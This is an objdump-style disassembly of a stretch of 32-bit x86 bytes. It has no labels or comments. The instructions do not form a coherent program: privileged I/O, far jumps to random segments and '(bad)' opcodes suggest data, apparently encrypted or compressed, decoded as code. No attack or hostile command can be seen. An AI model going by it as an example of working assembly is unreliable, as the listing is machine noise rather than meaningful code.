  423086:	arpl   WORD PTR [edi],di
  423088:	loop   0x423048
  42308a:	mov    ds:0x5b7006cf,al
  42308f:	in     al,dx
  423090:	mov    ds:0xa72c9240,al
  423095:	xor    dl,BYTE PTR [eax-0x76eb4e19]
  42309b:	pop    esp
  42309c:	mov    dh,0x3b
  42309e:	mov    dh,BYTE PTR ds:0xf3d716e8
  4230a4:	cwde   
  4230a5:	cdq    
  4230a6:	xor    dl,BYTE PTR [eax]
  4230a8:	clc    
  4230a9:	je     0x4230d9
  4230ab:	add    BYTE PTR [edi-0x2828facb],bh
  4230b1:	aam    0x14
  4230b3:	jmp    0xecd3:0x8c6b8e55
  4230ba:	pop    edi
  4230bb:	cdq    
  4230bc:	ja     0x423053
  4230be:	lahf   
  4230bf:	or     edi,DWORD PTR [ebp-0x34]
  4230c2:	mov    edi,0xef6edb79
  4230c7:	stos   BYTE PTR es:[edi],al
  4230c8:	ret    
  4230c9:	sub    al,0xd8
  4230cb:	bound  eax,QWORD PTR [eax*1-0x4b7982e2]
  4230d2:	aaa    
  4230d3:	imul   eax,esi,0x22
  4230d6:	retf   
  4230d7:	(bad)
  4230db:	dec    edi
  4230dc:	inc    esi
  4230dd:	push   ss
  4230de:	ret    0xbf5d
  4230e1:	push   ebx
  4230e2:	sahf   
  4230e3:	and    DWORD PTR ds:0x77248348,eax
  4230e9:	xor    BYTE PTR [edi+0x4a],cl
  4230ec:	add    ecx,edi
  4230ee:	test   BYTE PTR ds:0x2604bf2a,dh
  4230f4:	add    edi,DWORD PTR [esi]
  4230f6:	rcl    cl,1
  4230f8:	xchg   ebx,eax
  4230f9:	std    
  4230fa:	enter  0xfabe,0x65
  4230fe:	pop    edi
  4230ff:	cdq    
  423100:	mov    cl,0x55
  423102:	add    al,0xb1
  423104:	cld    
  423105:	or     DWORD PTR [ebp+esi*2+0x4e],edx
  423109:	xchg   DWORD PTR [esi-0x15],edx
  42310c:	pop    eax
  42310d:	les    eax,FWORD PTR [eax-0x6c]
  423110:	jno    0x42315f
  423112:	mov    ds:0xaa58b55d,eax
  423117:	push   es
  423118:	xchg   ecx,eax
  423119:	es std 
  42311b:	add    DWORD PTR [ebp-0x711ab639],esi
  423121:	bound  ebx,QWORD PTR [ebx+0x6dcd889e]
  423127:	int3   
  423128:	into   
  423129:	adc    al,0x26
  42312b:	push   ds
  42312c:	mov    al,ds:0x8e33ef3f
  423131:	out    dx,al
  423132:	cmp    BYTE PTR [ecx-0x2e846c29],cl
  423138:	daa    
  423139:	mov    ds:0x980934b3,eax
  42313e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42313f:	es jmp 0x423163
  423142:	cmp    al,BYTE PTR [ecx+0x309ee373]
  423148:	cmp    BYTE PTR [ecx+ecx*1+0x20878170],dl
  42314f:	popf   
  423150:	dec    ebx
  423151:	mov    edx,0x28d6fe41
  423156:	jmp    0x57af:0xcd008801
  42315d:	jne    0x4231cf
  42315f:	push   0xffffff8f
  423161:	dec    esi
  423162:	jb     0x4230ed
  423164:	dec    esi
  423165:	bound  eax,QWORD PTR [esp+edi*4-0x7]
  423169:	out    0x1d,eax
  42316b:	dec    esp
  42316c:	push   edi
  42316d:	push   eax
  42316e:	sahf   
  42316f:	jo     0x423199
  423171:	push   ecx
  423172:	xlat   BYTE PTR ds:[bx]
  423174:	ins    BYTE PTR es:[edi],dx
  423175:	cld    
  423176:	push   esi
  423177:	sub    al,0x88
  423179:	pop    esi
  42317a:	adc    dh,BYTE PTR ds:0xf88ced90
  423180:	enter  0xc088,0x9e
  423184:	inc    eax
  423185:	mov    ds:0x2e7deaf9,eax
  42318a:	and    al,0x94
  42318c:	pop    es
  42318d:	jnp    0x423185
  42318f:	loope  0x423149
  423191:	into   
  423192:	gs inc esi
  423194:	je     0x4231f7
  423196:	pop    esi
  423197:	dec    esp
  423198:	mov    eax,ds:0x9c52f71c
  42319d:	iret   
  42319e:	and    ebx,DWORD PTR [ecx]
  4231a0:	fwait
  4231a1:	mov    dh,BYTE PTR [eax+0x46c642c8]
  4231a7:	sbb    BYTE PTR [ecx+eiz*4],dl
  4231aa:	push   ebx
  4231ab:	dec    edi
  4231ac:	and    eax,0xf5c0bd66
  4231b1:	lea    esp,[edi+0x42843cdc]
  4231b7:	inc    edi
  4231b8:	add    cl,BYTE PTR [ecx+0x78]
  4231bb:	sahf   
  4231bc:	in     al,dx
  4231bd:	les    ecx,FWORD PTR [eax]
  4231bf:	jo     0x423236
  4231c1:	ins    BYTE PTR es:[edi],dx
  4231c2:	aas    
  4231c3:	xor    DWORD PTR [edi],ecx
  4231c5:	xchg   edi,eax
  4231c6:	rcl    ah,1
  4231c8:	ss jmp 0xe897af4a
  4231ce:	rol    ebp,cl
  4231d0:	mov    ebx,0xd0c2ecfc
  4231d5:	pop    esi
  4231d6:	dec    ebx
  4231d7:	fisub  WORD PTR [ecx]
  4231d9:	je     0x423238
  4231db:	in     al,dx
  4231dc:	daa    
  4231dd:	mov    ecx,0x5e5ac151
  4231e2:	sbb    esi,DWORD PTR [ebx-0x35]
  4231e5:	xor    ebp,ebx
  4231e7:	xor    BYTE PTR [edi],0x16
  4231ea:	lahf   
  4231eb:	in     eax,0xea
  4231ed:	sbb    eax,DWORD PTR [edi+ebp*1-0x463855d5]
  4231f4:	or     eax,0xdf017f29
  4231f9:	fs fs aaa 
  4231fc:	dec    ebx
  4231fd:	or     BYTE PTR [ebx-0xe7e767e],bh
  423203:	adc    bh,dh
  423205:	or     DWORD PTR [ebp+0x14ce144],0xffffffae
  42320c:	out    0x34,al
  42320e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42320f:	jb     0x4231e1
  423211:	loopne 0x423202
  423213:	mov    edi,0x6a9f91
  423218:	mov    ch,0xd2
  42321a:	or     al,0xeb
  42321c:	nop
  42321d:	adc    dl,BYTE PTR [ebx]
  42321f:	sbb    BYTE PTR ds:0x8c06b9ad,ch
  423225:	shl    BYTE PTR [eax-0x4e],0x9a
  423229:	popa   
  42322a:	jmp    0xefdf:0xefdfd516
  423231:	ss std 
  423233:	cmp    BYTE PTR [esi+0xa215f3a],al
  423239:	inc    ecx
  42323a:	loop   0x42329b
  42323c:	fld    QWORD PTR [ecx]
  42323e:	add    al,ch
  423240:	add    DWORD PTR [eax],eax
  423242:	add    BYTE PTR [esi],dh
  423244:	rcr    DWORD PTR [eax+0x6c437148],1
  42324a:	cmc    
  42324b:	jbe    0x42328c
  42324d:	call   0x5b08:0xf3f3da91
  423254:	inc    ebp
  423255:	cmp    eax,0x7d9ca2d6
  42325a:	loopne 0x4231e1
  42325c:	or     eax,0x4b2d3ffa
  423261:	adc    BYTE PTR [ebp+0x8],dl
  423264:	adc    dh,BYTE PTR [edi-0x1c626a3]
  42326a:	add    eax,0x3244f02e
  42326f:	sub    eax,ecx
  423271:	loopne 0x4231fe
  423273:	or     al,0xdd
  423275:	fwait
  423276:	add    cl,BYTE PTR [eax]
  423278:	outs   dx,BYTE PTR ds:[esi]
  423279:	xchg   ebx,eax
  42327a:	ja     0x4232c7
  42327c:	mov    ds:0x3da2a580,eax
  423281:	inc    esi
  423282:	pop    esi
  423283:	fnstsw WORD PTR ds:0x8a61d446
  423289:	dec    ecx
  42328a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42328b:	jae    0x4232e6
  42328d:	adc    DWORD PTR [edx+0x64],eax
  423290:	and    BYTE PTR [edx-0x1260ff7a],dh
  423296:	sub    DWORD PTR [edx],eax
  423298:	mov    esi,0x94dc58ce
  42329d:	repnz xor DWORD PTR [ebx],edi
  4232a0:	push   esp
  4232a1:	xchg   ebp,eax
  4232a2:	lahf   
  4232a3:	aas    
  4232a4:	pop    ecx
  4232a5:	mov    ah,BYTE PTR [ebx-0x64]
  4232a8:	cwde   
  4232a9:	mov    ecx,DWORD PTR [edx+ecx*1]
  4232ac:	jge    0x42330e
  4232ae:	mov    edi,0xd60e25e
  4232b3:	mov    WORD PTR ds:0xf960254b,cs
  4232b9:	mov    al,ds:0x8b12b56e
  4232be:	fstp   DWORD PTR [esi+0x88b83c0]
  4232c4:	mov    bh,0xb
  4232c6:	pop    esi
  4232c7:	xor    eax,0xc401a3ae
  4232cc:	pop    ebx
  4232cd:	gs pop ss
  4232cf:	iret   
  4232d0:	test   al,0x95
  4232d2:	jmp    0x423351
  4232d4:	inc    ebp
  4232d5:	loop   0x423289
  4232d7:	call   DWORD PTR [esi-0x6bd7b657]
  4232dd:	inc    edi
  4232de:	jne    0x42330c
  4232e0:	loopne 0x423272
  4232e2:	adc    esi,DWORD PTR [esi]
  4232e4:	jo     0x42332b
  4232e6:	ret    
  4232e7:	inc    eax
  4232e8:	in     al,0x89
  4232ea:	sub    DWORD PTR [ebx+esi*1],edi
  4232ed:	aas    
  4232ee:	xor    esi,edx
  4232f0:	sar    BYTE PTR [edx],cl
  4232f2:	push   ds
  4232f3:	sbb    BYTE PTR [ebx-0x795caf0d],bl
  4232f9:	aas    
  4232fa:	js     0x4232a9
  4232fc:	add    BYTE PTR [esi-0x80],al
  4232ff:	mov    ebx,0xfd1be169
  423304:	ss mov ch,0xc6
  423307:	loop   0x4232cc
  423309:	xchg   ebp,eax
  42330a:	(bad)  
  42330b:	aam    0xae
  42330d:	inc    ecx
  42330e:	adc    DWORD PTR [edi+eax*2],0x6d
  423312:	stos   BYTE PTR es:[edi],al
  423313:	(bad)  
  423315:	adc    esi,DWORD PTR [ebx]
  423317:	adc    dh,BYTE PTR [eax]
  423319:	daa    
  42331a:	outs   dx,DWORD PTR ds:[esi]
  42331b:	iret   
  42331c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42331d:	sub    bl,BYTE PTR [edi]
  42331f:	add    DWORD PTR ds:0xc37d3714,esp
  423325:	pop    edx
  423326:	and    DWORD PTR [ecx+eax*1-0x73fcfad0],ebx
  42332d:	xor    ah,cl
  42332f:	scas   al,BYTE PTR es:[edi]
  423330:	fwait
  423331:	and    dl,BYTE PTR [edi+0xc]
  423334:	xchg   edi,eax
  423335:	pop    eax
  423336:	cmp    BYTE PTR [eax-0x20b7d539],bh
  42333c:	stos   DWORD PTR es:[edi],eax
  42333d:	inc    esi
  42333e:	repz aam 0xaf
  423341:	out    0xc5,eax
  423343:	cmp    DWORD PTR [esi+0x2],0x4a0ade46
  42334a:	mov    WORD PTR [esi-0x70],gs
  42334d:	pop    edi
  42334e:	or     esp,DWORD PTR [ecx]
  423350:	popf   
  423351:	(bad)  
  423352:	pop    edx
  423353:	test   BYTE PTR [esi-0x38607421],bh
  423359:	retf   
  42335a:	mov    dl,0xde
  42335c:	add    BYTE PTR [edx-0x7399e14f],bh
  423362:	inc    edi
  423363:	sub    DWORD PTR [ecx-0x4a],edx
  423366:	sub    BYTE PTR [esi-0x5],ch
  423369:	inc    esi
  42336a:	mov    ebp,0x8792e12e
  42336f:	cmp    BYTE PTR [ebx+ecx*1+0x5a91e530],dl
  423376:	sbb    BYTE PTR [eax],ah
  423378:	or     BYTE PTR [esi+0x57564868],bh
  42337e:	add    BYTE PTR [edx+0x7c67f1d],al
  423384:	xchg   esp,eax
  423385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423386:	mov    ah,ch
  423388:	pusha  
  423389:	or     al,cl
  42338b:	jo     0x42332a
  42338d:	mov    edi,0x63257eeb
  423392:	imul   edi,DWORD PTR [edx-0x950bfcd],0xffffffff
  423399:	iret   
  42339a:	push   ecx
  42339b:	jo     0x42340c
  42339d:	add    cl,cl
  42339f:	pop    edi
  4233a0:	sbb    edi,DWORD PTR [edi]
  4233a2:	scas   al,BYTE PTR es:[edi]
  4233a3:	inc    ebp
  4233a4:	jge    0x4233e9
  4233a6:	push   eax
  4233a7:	xchg   esp,eax
  4233a8:	mov    ds:0x1b9616fc,eax
  4233ad:	cmp    eax,0x8f541504
  4233b2:	leave  
  4233b3:	and    ebx,DWORD PTR [eax-0x7024fef1]
  4233b9:	pop    ebp
  4233ba:	mov    al,ds:0x2d9e7808
  4233bf:	test   eax,0x4dada55c
  4233c4:	xor    eax,DWORD PTR [eax+0x405c77c2]
  4233ca:	xor    ebp,edx
  4233cc:	fldenv [ebp+0x5dfe8c16]
  4233d2:	jo     0x42342a
  4233d4:	xchg   bl,ch
  4233d6:	add    eax,0x77058efd
  4233db:	inc    eax
  4233dc:	hlt    
  4233dd:	sub    edi,DWORD PTR ds:0x35b8f2a2
  4233e3:	mov    ds:0x64ccd1b2,al
  4233e8:	nop
  4233e9:	sbb    eax,0xb4e4acbc
  4233ee:	mov    edi,0x8d07f68c
  4233f3:	mov    cl,0xc4
  4233f5:	dec    eax
  4233f6:	sar    BYTE PTR [edx],1
  4233f8:	mov    ebp,cs
  4233fa:	imul   BYTE PTR [ecx+0x7a15d2b]
  423400:	xchg   edi,eax
  423401:	adc    DWORD PTR [eax*4+0x24d0a82e],ecx
  423408:	ds xchg edx,eax
  42340a:	loop   0x423460
  42340c:	jmp    0xf40111a7
  423411:	call   0xc10fe917
  423416:	dec    eax
  423417:	cmp    al,0x5
  423419:	fcomp  st(2)
  42341b:	push   edi
  42341c:	popa   
  42341d:	cmp    bh,BYTE PTR ds:[ebp+0x442e87fe]
  423424:	dec    edi
  423425:	push   cs
  423426:	mov    ebx,0x3dfe7b7
  42342b:	outs   dx,BYTE PTR ds:[esi]
  42342c:	jbe    0x423412
  42342e:	retf   0xdafc
  423431:	outs   dx,BYTE PTR ds:[esi]
  423432:	neg    BYTE PTR [eax]
  423434:	xchg   edx,eax
  423435:	xchg   DWORD PTR [edi-0x162d8257],edx
  42343b:	inc    edi
  42343c:	fild   WORD PTR [ecx]
  42343e:	add    al,ch
  423440:	add    DWORD PTR [eax],eax
  423442:	add    BYTE PTR [edx],cl
  423444:	adc    ah,bh
  423446:	call   0xadd30b6
  42344b:	xor    BYTE PTR [ecx-0x7d],dl
  42344e:	ficom  DWORD PTR [esi-0x2e757232]
  423454:	and    DWORD PTR [ecx+0x2873fb20],ecx
  42345a:	and    BYTE PTR [ebp+ebp*4+0x59d7e895],0xde
  423462:	or     ebp,DWORD PTR [edx-0x6afed71a]
  423468:	jg     0x4233f9
  42346a:	pop    ecx
  42346b:	push   edx
  42346c:	cmp    esi,DWORD PTR [edx]
  42346e:	sub    eax,0xfff75f27
  423473:	and    eax,0x8b77bf2b
  423478:	aas    
  423479:	mov    al,bl
  42347b:	push   esi
  42347c:	fsub   DWORD PTR [edx-0x1b454566]
  423482:	inc    esi
  423483:	sar    BYTE PTR [eax+0x392f252b],1
  423489:	pop    esp
  42348a:	sub    BYTE PTR [esi],bh
  42348c:	div    BYTE PTR [esi]
  42348e:	ret    0xf993
  423491:	stos   BYTE PTR es:[edi],al
  423492:	jecxz  0x423506
  423494:	push   0xffffffff
  423496:	sbb    DWORD PTR ds:0xd6905b76,edx
  42349c:	es aaa 
  42349e:	dec    ebx
  42349f:	call   0xb9ee:0xa86581b2
  4234a6:	inc    esp
  4234a7:	inc    eax
  4234a8:	fidivr DWORD PTR [eax]
  4234aa:	lods   eax,DWORD PTR ds:[esi]
  4234ab:	js     0x423496
  4234ad:	inc    ecx
  4234ae:	je     0x4234ca
  4234b0:	inc    ebx
  4234b1:	dec    ebp
  4234b2:	mov    ebp,0x33ce189a
  4234b7:	pusha  
  4234b8:	sbb    eax,0x50
  4234bb:	imul   eax,esi,0x37ee3818
  4234c1:	(bad)  
  4234c2:	jo     0x4234ee
  4234c4:	sub    bh,BYTE PTR [edi+0x7f]
  4234c7:	cli    
  4234c8:	mov    eax,es:0x4354fd95
  4234ce:	inc    esp
  4234cf:	out    dx,al
  4234d0:	cmp    eax,0x9a8c5cc2
  4234d5:	dec    ecx
  4234d6:	or     bh,BYTE PTR [ebx-0x1f]
  4234d9:	das    
  4234da:	ins    DWORD PTR es:[edi],dx
  4234db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234dc:	les    edx,FWORD PTR [ecx+0x468a5a14]
  4234e2:	iret   
  4234e3:	push   0xecd41b43
  4234e8:	mov    esp,0xebe6529a
  4234ed:	and    DWORD PTR ds:[ebp-0x73],eax
  4234f1:	ins    DWORD PTR es:[edi],dx
  4234f2:	jbe    0x4234f1
  4234f4:	pop    ecx
  4234f5:	fcmovnu st,st(4)
  4234f7:	lahf   
  4234f8:	xor    dl,BYTE PTR [eax-0x1d]
  4234fb:	sub    ah,dh
  4234fd:	xchg   ecx,ebp
  4234ff:	call   0x884c:0x770f8abe
  423506:	sub    al,0x97
  423508:	das    
  423509:	sbb    dl,ah
  42350b:	jne    0x423553
  42350d:	adc    esi,DWORD PTR [eax-0x44]
  423510:	imul   esi,DWORD PTR [eax-0x6d],0x60407dd
  423517:	shl    DWORD PTR [ebp+0x170d153],1
  42351d:	jle    0x423506
  42351f:	mov    bl,0xa4
  423521:	push   es
  423522:	pop    eax
  423523:	inc    ecx
  423524:	push   esp
  423525:	rol    BYTE PTR [edx-0x3b],1
  423528:	xor    DWORD PTR [edx+0x26],esi
  42352b:	fnstenv [edx]
  42352d:	iret   
  42352e:	cld    
  42352f:	out    0x74,al
  423531:	popa   
  423532:	dec    edi
  423533:	jmp    0x423586
  423535:	outs   dx,BYTE PTR ds:[esi]
  423536:	jno    0x42356b
  423538:	test   eax,0x46fe755e
  42353d:	(bad)  
  42353f:	or     DWORD PTR [eax],0xffffffa4
  423542:	inc    ecx
  423543:	scas   eax,DWORD PTR es:[edi]
  423544:	xchg   edx,eax
  423545:	cmp    dl,BYTE PTR [ebx]
  423547:	lahf   
  423548:	ds in  eax,0xc5
  42354b:	ja     0x423502
  42354d:	fdiv   QWORD PTR [esp+ecx*2+0x78c3b9fb]
  423554:	fdivr  QWORD PTR [ebp+ebp*1+0x4fbebae6]
  42355b:	and    BYTE PTR [eax],ah
  42355d:	(bad)  
  42355e:	cmp    dh,BYTE PTR [esi+ebx*1-0x61557722]
  423565:	jo     0x4235c7
  423567:	cs jmp 0x423526
  42356a:	test   eax,0xb82765f1
  42356f:	jge    0x4235e3
  423571:	shr    ebx,1
  423573:	push   ebx
  423574:	ret    0x2578
  423577:	push   edi
  423578:	inc    esi
  423579:	dec    esp
  42357a:	jecxz  0x4235eb
  42357c:	sbb    ebx,esi
  42357e:	loop   0x4235e9
  423580:	pop    ebp
  423581:	sub    BYTE PTR [ebx+0x60],cl
  423584:	(bad)  
  423585:	pop    ss
  423586:	push   0x16d09865
  42358b:	(bad)  [edx-0x2c]
  42358e:	(bad)  
  42358f:	sub    DWORD PTR [ebp-0x39],eax
  423592:	shl    DWORD PTR [ebx],1
  423594:	push   edx
  423595:	lods   al,BYTE PTR ds:[esi]
  423596:	mov    dl,0xac
  423598:	jb     0x42353e
  42359a:	ds inc eax
  42359c:	(bad)
  4235a1:	sub    dl,BYTE PTR [esi-0x7e]
  4235a4:	ret    0x2fc8
  4235a7:	loopne 0x42361b
  4235a9:	iret   
  4235aa:	ja     0x423564
  4235ac:	jne    0x423567
  4235ae:	in     eax,0x2a
  4235b0:	xor    eax,0xcf6ec251
  4235b5:	repnz push eax
  4235b7:	push   ebp
  4235b8:	jmp    FWORD PTR [ebx-0x24]
  4235bb:	scas   al,BYTE PTR es:[edi]
  4235bc:	mov    DWORD PTR [eax-0x1fb8b09b],ebx
  4235c2:	jno    0x423607
  4235c4:	shl    BYTE PTR [eax],1
  4235c6:	pop    ecx
  4235c7:	imul   BYTE PTR [eax-0x634d730e]
  4235cd:	sub    DWORD PTR [edi+eax*8+0x4ee43a1b],0xf31bb5b7
  4235d8:	xor    DWORD PTR [edi+0x21564f0c],ebp
  4235de:	or     bh,bl
  4235e0:	mov    bl,0x66
  4235e2:	fwait
  4235e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235e4:	mov    dl,0x9b
  4235e6:	dec    ebp
  4235e7:	adc    BYTE PTR [edx],ah
  4235e9:	ins    BYTE PTR es:[edi],dx
  4235ea:	and    al,0xad
  4235ec:	adc    BYTE PTR [edx+0x35],bh
  4235ef:	sbb    eax,DWORD PTR [edx-0x5bbff8a5]
  4235f5:	mov    al,0x4f
  4235f7:	rcl    BYTE PTR [ecx+0x44],cl
  4235fa:	cmp    DWORD PTR [esi*2-0x4e122890],ebp
  423601:	sub    edi,DWORD PTR [edi+0x6b]
  423604:	adc    eax,esp
  423606:	sahf   
  423607:	out    dx,al
  423608:	leave  
  423609:	or     BYTE PTR [ebp-0x7477e2d1],bl
  42360f:	repnz gs sahf 
  423612:	dec    ebx
  423613:	dec    esi
  423614:	dec    ecx
  423615:	popf   
  423616:	es adc al,0x78
  423619:	jp     0x423691
  42361b:	jle    0x42359d
  42361d:	lds    eax,FWORD PTR [eax+0x20]
  423620:	(bad)  
  423621:	pop    ebx
  423622:	pusha  
  423623:	in     al,dx
  423624:	xchg   esi,eax
  423625:	int    0x11
  423627:	inc    ecx
  423628:	clc    
  423629:	rcl    dl,cl
  42362b:	cmp    dl,BYTE PTR [edx-0x3c]
  42362e:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  423635:	nop
  423636:	rol    DWORD PTR [ebp+0x2f74a2b5],cl
  42363c:	loope  0x42363f
  42363e:	add    al,ch
  423640:	add    DWORD PTR [eax],eax
  423642:	add    bl,bl
  423644:	dec    ebx
  423645:	outs   dx,BYTE PTR ds:[esi]
  423646:	mov    eax,ds:0xf0564a8
  42364b:	adc    cl,BYTE PTR [edx-0x10f63a06]
  423651:	pop    ds
  423652:	lods   eax,DWORD PTR ds:[esi]
  423653:	and    bh,bl
  423655:	shl    bh,1
  423657:	in     al,0x27
  423659:	dec    ecx
  42365a:	mov    edx,0xcfd5c1db
  42365f:	sbb    ah,cl
  423661:	std    
  423662:	hlt    
  423663:	(bad)  
  423665:	stos   DWORD PTR es:[edi],eax
  423666:	dec    eax
  423667:	dec    eax
  423668:	sbb    eax,0x7708eca9
  42366d:	sbb    ecx,edx
  42366f:	mov    edx,DWORD PTR [eax]
  423671:	cmp    al,0x9
  423673:	add    al,0xa8
  423675:	outs   dx,BYTE PTR ds:[esi]
  423676:	and    DWORD PTR [ebx-0x54],ecx
  423679:	mov    edx,0x7d89138d
  42367e:	outs   dx,BYTE PTR ds:[esi]
  42367f:	sub    ch,BYTE PTR [edx+esi*2]
  423682:	lock fwait
  423684:	and    al,0xeb
  423686:	add    DWORD PTR [esi-0x14b9cd8d],ebx
  42368c:	or     ecx,DWORD PTR [ebp+esi*2-0x53c435e1]
  423693:	dec    eax
  423694:	rcl    BYTE PTR [ecx-0x11e3e9f],cl
  42369a:	dec    ebx
  42369b:	sbb    DWORD PTR [ebx-0x3b],edi
  42369e:	out    dx,eax
  42369f:	inc    ebx
  4236a0:	jle    0x42363c
  4236a2:	cdq    
  4236a3:	mov    dl,0xcd
  4236a5:	in     eax,dx
  4236a6:	and    cl,cl
  4236a8:	xchg   esp,eax
  4236a9:	and    al,al
  4236ab:	rcr    ah,1
  4236ad:	push   0xa192f31f
  4236b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236b3:	dec    edx
  4236b4:	into   
  4236b5:	and    eax,0x9ec6522
  4236ba:	xchg   ebp,eax
  4236bb:	xlat   BYTE PTR ds:[ebx]
  4236bc:	xchg   ecx,eax
  4236bd:	and    esp,DWORD PTR [esi]
  4236bf:	mov    dl,0xea
  4236c1:	sbb    DWORD PTR [edx+edi*1],edi
  4236c4:	out    0xb1,al
  4236c6:	retf   0xc4d0
  4236c9:	fxch   st(3)
  4236cb:	hlt    
  4236cc:	jo     0x42370e
  4236ce:	retf   0x26ca
  4236d1:	and    al,0xc4
  4236d3:	cs push 0xc474af58
  4236d9:	gs push edi
  4236db:	jmp    0x2886:0xb7ed3692
  4236e2:	mov    ecx,0xa2ddfc5d
  4236e7:	mov    ecx,0xc2f49f30
  4236ec:	icebp  
  4236ed:	adc    al,0xbb
  4236ef:	jl     0x423708
  4236f1:	push   esp
  4236f2:	sbb    eax,0xc80eb9c2
  4236f7:	pop    es
  4236f8:	pop    ebx
  4236f9:	call   0xfa10:0x3db02803
  423700:	xor    al,0xf3
  423702:	jmp    0x4e7cb3e3
  423707:	out    0x96,al
  423709:	xchg   esi,eax
  42370a:	pop    eax
  42370b:	stos   DWORD PTR es:[edi],eax
  42370c:	mov    ecx,0xae5b3efd
  423711:	pop    es
  423712:	sub    al,0x18
  423714:	push   ss
  423715:	inc    ebp
  423716:	xchg   ebp,eax
  423717:	loopne 0x423746
  423719:	mov    ch,0x9b
  42371b:	int    0xbc
  42371d:	and    esi,DWORD PTR [eax]
  42371f:	push   cs
  423720:	push   esi
  423721:	push   ss
  423722:	inc    esi
  423723:	call   0x9dd0:0xcbee8442
  42372a:	sahf   
  42372b:	inc    ebx
  42372c:	ins    DWORD PTR es:[edi],dx
  42372d:	push   eax
  42372e:	xchg   esi,eax
  42372f:	push   es
  423730:	lods   eax,DWORD PTR ds:[esi]
  423731:	cmc    
  423732:	fwait
  423733:	sub    ch,BYTE PTR [edx+0x4930693b]
  423739:	jne    0x4237a8
  42373b:	je     0x423751
  42373d:	(bad)  
  42373e:	and    al,BYTE PTR [ecx]
  423740:	lea    eax,[edi+0x1d]
  423743:	pop    edx
  423744:	test   esp,ebx
  423746:	fwait
  423747:	pop    esp
  423748:	sahf   
  423749:	loope  0x423716
  42374b:	adc    al,0x66
  42374d:	test   edx,ebp
  42374f:	call   ebx
  423751:	lds    ecx,FWORD PTR [ebx+0x7b]
  423754:	sub    dh,BYTE PTR [esi+0x25]
  423757:	ror    ch,1
  423759:	addr16 popf 
  42375b:	(bad)  
  42375c:	aaa    
  42375d:	add    ah,BYTE PTR [ebx-0x36]
  423760:	jg     0x4236e9
  423762:	fs ins BYTE PTR es:[edi],dx
  423764:	pop    edi
  423765:	xor    eax,0xf6673a50
  42376a:	daa    
  42376b:	lea    esp,[ebp+0x41]
  42376e:	and    eax,0xb8ad0256
  423773:	xchg   edi,eax
  423774:	icebp  
  423775:	enter  0x6dd1,0xd1
  423779:	mov    gs,edx
  42377b:	cmp    dl,BYTE PTR [ecx]
  42377d:	fidivr DWORD PTR [esi-0x33]
  423780:	inc    eax
  423781:	stos   BYTE PTR es:[edi],al
  423782:	inc    ebx
  423783:	fs sub eax,0x7ac7da88
  423789:	shl    BYTE PTR [esi+0x21db76ab],cl
  42378f:	call   0x1a0:0xee6e4ea2
  423796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423797:	and    edi,ebx
  423799:	mov    eax,0x6cd5f27f
  42379e:	xor    bl,dh
  4237a0:	jecxz  0x423793
  4237a2:	sahf   
  4237a3:	daa    
  4237a4:	pushf  
  4237a5:	adc    ch,bl
  4237a7:	mov    ebp,0x94cb9729
  4237ac:	mov    ecx,0x27c1f41e
  4237b1:	mov    al,0x8f
  4237b3:	stos   DWORD PTR es:[edi],eax
  4237b4:	out    dx,eax
  4237b5:	(bad)
  4237ba:	jno    0x4237eb
  4237bc:	sub    ecx,DWORD PTR [edx]
  4237be:	pusha  
  4237bf:	mov    ecx,0x6260d5db
  4237c4:	pusha  
  4237c5:	jne    0x423805
  4237c7:	call   0xd91f:0xdc9a45f2
  4237ce:	fbstp  TBYTE PTR [eax+0x27118043]
  4237d4:	test   BYTE PTR [si+0x61e4],cl
  4237d9:	mov    cl,0x66
  4237db:	inc    edi
  4237dc:	mulps  xmm1,XMMWORD PTR [ecx+0x52]
  4237e0:	les    ebx,FWORD PTR [ecx-0x54]
  4237e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237e4:	je     0x42382e
  4237e6:	or     BYTE PTR [esi],ah
  4237e8:	mov    ds:0x63cb70,al
  4237ed:	and    al,0x72
  4237ef:	(bad)  
  4237f0:	in     eax,0x54
  4237f2:	mov    cl,0x88
  4237f4:	call   0x1d2a65d4
  4237f9:	repnz cmp DWORD PTR [edx],eax
  4237fc:	dec    edx
  4237fd:	mov    bh,0x43
  4237ff:	popf   
  423800:	ins    BYTE PTR es:[edi],dx
  423801:	loop   0x423840
  423803:	cmp    al,cl
  423805:	mov    eax,ds:0xa9b4788b
  42380a:	xor    bl,bh
  42380c:	bound  edi,QWORD PTR es:[edi]
  42380f:	inc    ecx
  423810:	jns    0x42388b
  423812:	push   0xa392d2fe
  423817:	mov    BYTE PTR [edx+0x56],cl
  42381a:	and    al,0x3a
  42381c:	push   edi
  42381d:	mov    ecx,0xc275a5fc
  423822:	and    al,0x50
  423824:	loop   0x4237db
  423826:	mov    edi,0xcdbe66fe
  42382b:	xchg   ebx,eax
  42382c:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  423833:	push   eax
  423834:	loopne 0x423830
  423836:	call   0xe317:0xea540217
  42383d:	add    DWORD PTR [eax],eax
  42383f:	call   0x12423845
  423844:	in     al,0x93
  423846:	aas    
  423847:	sar    BYTE PTR [ecx-0x30],0x7c
  42384b:	mov    al,ds:0xbc24648
  423850:	sar    BYTE PTR ds:[ebx+esi*1+0x8],0x1f
  423856:	leave  
  423857:	shl    DWORD PTR [ebp+0x52baf226],cl
  42385d:	fcompp 
  42385f:	adc    ch,BYTE PTR [esi+0x37fa868]
  423865:	jge    0x423866
  423867:	xchg   edi,eax
  423868:	mov    ds:0x1cdf2d80,al
  42386d:	imul   esp,DWORD PTR [eax-0x53b0e42f],0x9afc7926
  423877:	push   ebx
  423878:	test   DWORD PTR [ebp+eiz*4+0x8],eax
  42387c:	xchg   ebp,eax
  42387d:	jno    0x423866
  42387f:	inc    edx
  423880:	and    al,BYTE PTR [ebp+ebp*4-0x3b]
  423884:	cmp    esp,DWORD PTR [ecx-0x19]
  423887:	cmp    DWORD PTR [edi],edx
  423889:	stc    
  42388a:	or     cl,dh
  42388c:	test   BYTE PTR [ebx],bh
